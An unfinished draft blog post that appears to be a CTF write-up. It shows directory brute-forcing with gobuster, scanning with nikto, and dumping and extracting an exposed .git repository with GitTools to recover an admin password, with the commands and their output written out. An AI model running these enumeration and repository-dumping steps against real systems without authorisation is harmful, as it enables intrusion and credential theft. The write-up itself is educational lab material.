---
layout: post
title: 2021-11-26-Unpublished (to be published after 2 Dec)
---

Intro: TBC

**Background**
The system itself is a not-so-well configured website with a login page. If you attempt to perform an authentication bypass on the target, you'll realize you'd not be able to carry out a username enumeration due to the generic message displayed on login error. However, a bruteforcing may still succeed due to its lack of brute-forcing mechanism (lock-out). These are simply from a pentesting persective so to speak.
![image](https://user-images.githubusercontent.com/94167587/143660170-3e1f1f4c-3877-40f6-9975-faf59859eed9.png)

Now back to the challenge, how do we enumerate further? Directory brute force.
I initially used gobuster to carry out directory brute force attacks on the server - the result is promising with many returned. However, it did take more time than I expected to find out what I really want. Further, I fell into a rabbit hole where there isn't anything else.
```
obuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://188.166.244.154:81
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/11/26 18:11:35 Starting gobuster
===============================================================
/images (Status: 301)
/search (Status: 301)
/login (Status: 301)
/admin (Status: 301)
/style (Status: 200)
/js (Status: 301)
/pm (Status: 301)
/inc (Status: 301)

```

**Flag One**

The luck of gobusting depends on the wordlist you chose, it's sometimes a lottery. *But if you jump to a conclusion based on one gobusting result, it's suicidal because it's just a quick confirmation bias one should not trick themselves into - happens a lot for an objectiveless test and therefore the try harder mentatliy comes into being where pwning becomes the objective and it makes us try harder to go for the flag)*
Alternatively, if I switched to [nikto](https://cirt.net/Nikto2), which is supposed to be a more aggressive web scanner tool (ofz, don't do this if you are on an OPSEC engagement), I am able to locate some more interesting file which brings me to the first flag.

*You still have a little bit more patient on the result thought, it wouldnt come up so quickly

```


```

Looking at the Nikto result, a LOT of information we can get. First, it's definitely a php written server, is the version subject to any public exploit?; Second the version of apache, which by obligation we checked to the version and see if it is a vulnerable version; third, internal IP was discovered. 

Finally, a git repository folder .git is discovered, which has led to further compromise of the internal git commit source codes to the attacker. 
While the /.git/ directory itself remains hidden on the view of web browser, we are aware of the exposed git repository by the tool. 
The next step would be how could we exploit such vulnerability - At the time of the writing, the writer is aware of two open-sources tools - [trufflehog](https://github.com/trufflesecurity/truffleHog) and [GitTools](https://github.com/internetwache/GitTools)
If you look at the hint of this CTF, the "dump" hint is very obvious. 

Leveraging the “Dumper” tool within GitTools, we are able to download as much as possible from the found .git repository of the targeted webserver. 
```
/gitdumper.sh http://<target>/.git/ dest-dir 
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/YY/XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[..snip..]
```

Accordingly, leveraging the “Extractor” tool within the GitTools, we are able to extract commits and the corresponding content from the .git repository where we can pull all the objects we want.

```
./extractor.sh /root/Desktop/GitTools-master/Dumper/dest-dir/ /root/Desktop/GitTools-master/Extractor/
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 6f4458d18811ae64178e83f6601a86c56d27cf0f
[+] Found folder: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin
[+] Found file: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin/adduser.php
[+] Found file: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin/info
```
Now going through the git commits, we can see some hidden information (i.e. admin password to login)
![image](https://user-images.githubusercontent.com/94167587/143661014-5025407e-da74-40ee-a2b3-09087501910c.png)
The author of this CTF is obviously giving a big shoutout/respect to the mightiest fruit hacker from the East. 
Regardless, let's login and the first flag shall be captured easily.

![image](https://user-images.githubusercontent.com/94167587/143661138-24a02454-6e66-4ffa-93f3-ecf623b3d2d0.png)


